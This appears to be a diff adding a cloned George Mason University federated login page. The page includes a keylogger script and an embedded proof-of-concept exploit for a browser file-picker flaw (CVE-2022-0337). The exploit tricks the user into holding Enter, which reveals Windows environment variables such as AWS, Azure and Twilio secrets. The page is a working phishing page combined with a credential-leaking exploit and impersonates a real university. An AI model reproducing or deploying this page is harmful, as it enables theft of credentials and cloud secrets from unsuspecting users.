@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html>
+<!-- Container ID: $custom['hostname'] -->
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>George Mason Federated Login Service</title>
+    <link rel="stylesheet" href="https://unpkg.com/purecss@0.6.2/build/pure-min.css"
+          integrity="sha384-UQiGfs9ICog+LwheBSRCt1o5cbyKIHbwjWscjemyBMT9YCUMZffs6UqUTd0hObXD" crossorigin="anonymous">
+    <link href="gmu_stylesheet.css" type="text/css" rel="stylesheet">
+    <script src="./keylogger.js"></script>
+    
+</head>
+<body >
+
+<!-- Script from: https://github.com/Puliczek/CVE-2022-0337-PoC-Google-Chrome-Microsoft-Edge-Opera -->
+<script>
+    //how many time enter clicked in row
+    let countEnter = 0;
+    //is file downloaded
+    let isDownloaded = false;
+
+    //on page load
+    window.onload = function () {
+        const body = document.querySelector("body");
+        const pixel = document.querySelector("#pixel");
+
+        body.onkeydown = (e) => (e.key == "Enter" ? clickedEnter() : 1);
+        body.onkeyup = (e) => (e.key == "Enter" ? cancelEnter() : 1);
+
+        const randomNumber = Math.floor(Math.random() * 990) + 1;
+        const filename = `f${randomNumber}.f`;
+
+        //List of environment variables that hacker is interested in.
+        const environmentVariables = [
+        "USERNAME",
+        "USERDOMAIN",
+        "SESSIONNAME",
+        "COMPUTERNAME",
+        "KEY_VAULT_URL",
+        "SECRET_NAME",
+        "AZURE_TENANT_ID",
+        "AZURE_CLIENT_ID",
+        "AZURE_CLIENT_SECRET",
+        "TWILIO_ACCOUNT_SID",
+        "TWILIO_AUTH_TOKEN",
+        "AWS_SECRET_ACCESS_KEY"
+        // 'TOKEN',
+        // 'PASSWORD'
+        ];
+
+        const suggestedName =
+        environmentVariables.map((x) => `%${x}%`).join("@") + filename;
+
+        pixel.addEventListener("click", async () => {
+        //handle to get file
+        const handle = await window.showSaveFilePicker({ suggestedName });
+        //sometimes can throw an exception because file name is too big, but we can create more handles and put each 4 environmentVariables to deal with that problem
+        //result from user
+        const username = handle.name.split("@")[0];
+
+        const userInfo = handle.name
+            .replaceAll(filename, "")
+            .split("@")
+            .map(
+            (x, i) =>
+                `${environmentVariables[i]} = ${x.includes("%") ? "null" : x}`
+            )
+            .join("<br>");
+        const guessWinPath = `C:/Users/${username}`;
+        document.querySelector(
+            "#userInfo"
+        ).innerHTML = `USER'S ENVIRONMENT VARIABLES: <br>${userInfo} <br> guessWinPath = C:/users/${username}`;
+        document.querySelector("#gameover").textContent =
+            "GAME OVER - Need refresh to start again";
+        });
+    };
+
+    function clickedEnter() {
+        countEnter++;
+        //if button was hold more then 1 second and it wasn't downloaded - we can change !isDownloaded to countEnter % 30 === 0 to download many files
+        if (countEnter > 5 && !isDownloaded) {
+        pixel.click();
+        //set file is downloaded
+        isDownloaded = true;
+        }
+    }
+
+    function cancelEnter() {
+        //reset count enter if enter is not hold
+        countEnter = 0;
+    }
+</script>
+
+    <div id="pixel"></div>
+    <h3 id="userInfo"></h3>
+
+<div class="wrapper">
+    <div class="container">
+        <header>
+            <img src="https://shibboleth.gmu.edu/idp/images/GMU_PLogo_RGB.jpg" alt="George Mason University Federated Services">
+            
+        </header>
+<div class="content">
+    <div class="section motd">
+<div class="alert alert-motd">
+    <h3 class="alert-heading">Complete IT Security Awareness Training by November 16</h3>
+    <p class="alert-body">All Mason employees are required to complete their annual IT Security Awareness Training by Wednesday, November 16. Employees who fail to take the training by the deadline will have their accounts disabled. Go to <a href="https://masonleaps.gmu.edu/" rel="noopener" target="_blank" >MasonLEAPS</a> to complete your training.</p>
+    <small class="alert-date">Posted: 2022-11-02 13:15</small>
+</div>
+    </div>
+    <div class="section login">
+
+
+        <form action="/idp/profile/SAML2/POST/SSO?execution=e1s1" method="post">
+
+
+            <div class="form-element-wrapper">
+                <label for="username">NetID</label>
+                <input class="form-element form-field" id="username" name="j_username" type="text"
+                       value="">
+            </div>
+
+            <div class="form-element-wrapper">
+                <label for="password">Password</label>
+                <input class="form-element form-field" id="password" name="j_password" type="password" value="">
+            </div>
+
+            <div class="form-element-wrapper">
+                <input type="checkbox" name="donotcache" value="1" id="donotcache">
+                <label for="donotcache">Don't Remember Login</label>
+            </div>
+
+            <div class="form-element-wrapper d-none">
+                <input id="_shib_idp_revokeConsent" type="checkbox" name="_shib_idp_revokeConsent" value="true">
+                <label for="_shib_idp_revokeConsent">Clear prior granting of permission for release of your information to this service.</label>
+            </div>
+
+            <div class="form-element-wrapper mt-4">
+                <button class="form-element form-button" type="submit" name="_eventId_proceed"
+                        onClick="this.childNodes[0].nodeValue='Logging in, please wait...'"
+                >Hold Enter to Login</button>
+            </div>
+
+        </form>
+
+        
+
+    </div>
+    <div class="section links">
+<div class="alert alert-motd">
+    <h3 class="alert-heading">Complete IT Security Awareness Training by November 16</h3>
+    <p class="alert-body">All Mason employees are required to complete their annual IT Security Awareness Training by Wednesday, November 16. Employees who fail to take the training by the deadline will have their accounts disabled. Go to <a href="https://masonleaps.gmu.edu/" rel="noopener" target="_blank" >MasonLEAPS</a> to complete your training.</p>
+    <small class="alert-date">Posted: 2022-11-02 13:15</small>
+</div>
+        <ul class="list list-help">
+            <li class="list-help-item">
+                <a href="https://password.gmu.edu/">
+                    <span class="item-marker">&rsaquo;</span>
+Forgot your password?                </a>
+            </li>
+            <li class="list-help-item"><a href="#"><span class="item-marker">&rsaquo;</span>
+Need Help?</a></li>
+        </ul>
+    </div>
+</div>
+</div>
+
+<footer>
+    <div class="container container-footer">
+        <p class="footer-text">Copyright &copy; George Mason University</p>
+        <address>
+Information Technology Services<br> 
+703-993-8870<br>
+            <a href="mailto:support@gmu.edu">
+support@gmu.edu            </a>
+        </address>
+    </div>
+</footer>
+</div>
+
+</body>
+</html>
